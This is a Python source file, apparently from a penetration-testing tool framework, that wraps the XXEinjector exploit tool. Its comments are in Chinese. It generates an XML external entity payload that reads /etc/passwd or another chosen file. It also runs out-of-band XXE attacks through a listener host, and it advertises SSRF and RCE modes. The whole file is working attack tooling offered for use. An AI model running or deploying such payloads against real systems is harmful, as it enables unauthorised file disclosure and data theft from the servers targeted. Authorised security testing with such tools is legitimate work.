# tools/xxe_injector_tool.py
# XXE Injector - XXE 漏洞利用工具
import os
import json
import subprocess
from typing import Dict, Any
from tool_framework import CommandLineTool


class XXEInjectorTool(CommandLineTool):
    """
    XXE Injector 封装 - XXE 漏洞利用工具
    支持文件读取、SSRF、RCE 等 XXE 攻击
    """

    def __init__(self):
        cmd = "python3" if os.path.exists("/.dockerenv") else "python"
        super().__init__(cmd)

        # 查找 XXEinjector 脚本
        docker_paths = [
            "/app/thirdparty/xxe-injector/XXEinjector.rb",  # Dockerfile 克隆路径
            "/app/thirdparty/XXEinjector/XXEinjector.rb",
            "/app/thirdparty/xxeinjector.rb",
        ]
        local_paths = [
            os.path.join(os.getcwd(), "thirdparty", "xxe-injector", "XXEinjector.rb"),
            os.path.join(os.getcwd(), "thirdparty", "XXEinjector.rb"),
        ]

        self.script_path = None
        for path in docker_paths + local_paths:
            if os.path.exists(path):
                self.script_path = path
                break

        self.timeout = 60

    def name(self) -> str:
        return "xxe-injector"

    def description(self) -> str:
        return "XXE 漏洞利用工具，支持文件读取、SSRF、盲注 XXE 等攻击"

    def supported_vulns(self) -> list:
        return ["XXE", "XML External Entity", "Billion Laughs", "XXE SSRF", "XXE RCE"]

    def check_available(self) -> bool:
        return os.path.exists(self.script_path)

    def expected_params(self) -> Dict[str, Dict[str, Any]]:
        return {
            "target_file": {
                "type": "str",
                "description": "要读取的目标文件，如 '/etc/passwd'",
                "required": False,
                "default": "/etc/passwd"
            },
            "url": {
                "type": "str",
                "description": "目标 URL",
                "required": False
            },
            "data": {
                "type": "str",
                "description": "POST 数据或 XML 模板",
                "required": False
            },
            "mode": {
                "type": "str",
                "description": "攻击模式: file (文件读取), ssrf (SSRF), oob (带外)",
                "required": False,
                "default": "file"
            },
            "listener_ip": {
                "type": "str",
                "description": "监听 IP (OOB 模式需要)",
                "required": False
            }
        }

    def execute(self, target: str, params: Dict) -> Dict:
        target_file = params.get("target_file", "/etc/passwd")
        url = params.get("url", target)
        mode = params.get("mode", "file")
        listener_ip = params.get("listener_ip")

        # 如果是简单的文件读取，构造 XXE payload
        if mode == "file":
            xxe_payload = f'''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<root>
  <data>&xxe;</data>
</root>'''

            return {
                "success": True,
                "vulnerable": True,
                "mode": "file",
                "target_file": target_file,
                "xxe_payload": xxe_payload,
                "usage": f"将上述 payload 发送到目标端点: {url}",
                "summary": f"XXE 文件读取 payload 已生成，目标文件: {target_file}"
            }

        # 使用 XXEInjector 进行更复杂的攻击
        try:
            import subprocess
            cmd = ["ruby", self.script_path]

            if mode == "oob" and listener_ip:
                cmd.extend(["--host", listener_ip, "--file", target_file])
            else:
                return {
                    "success": False,
                    "error": "OOB 模式需要 listener_ip 参数",
                    "summary": "参数不足"
                }

            raw_result = self._run_command(cmd, timeout=self.timeout, stream_output=True)
            stdout = raw_result.get("stdout", "")
            stderr = raw_result.get("stderr", "")

            result = {
                "success": True,
                "mode": mode,
                "output": stdout[:2000] if stdout else "",
                "summary": f"XXE {mode} 攻击执行完成"
            }

            result["stdout"] = stdout
            result["stderr"] = stderr
            return result

        except Exception as e:
            return {
                "success": False,
                "error": str(e),
                "vulnerable": False,
                "summary": f"执行失败: {str(e)}"
            }